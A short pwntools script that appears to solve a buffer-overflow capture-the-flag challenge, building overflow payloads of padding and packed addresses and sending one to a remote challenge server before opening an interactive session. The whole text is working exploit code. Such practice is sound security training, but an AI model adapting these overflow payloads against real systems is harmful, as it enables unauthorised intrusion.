from pwn import *

payload = 'A'*20 + '1'

payload2 = b'A'*32 + p32(0x1234)

payload3 = b'A'*24 +b'junk'+p32(0x4011b6)

payload4 = b'A'*64 + b'junk12' + p32(0xdeefedaf)

#p = process("./bof")

p = remote('challenges.traboda.com', 8037)

p.sendlineafter('your hammer!\n',payload4)

#p = remote('challenges.traboda.com', 8031)

#p.sendline(payload2)

p.recvline()

p.interactive()
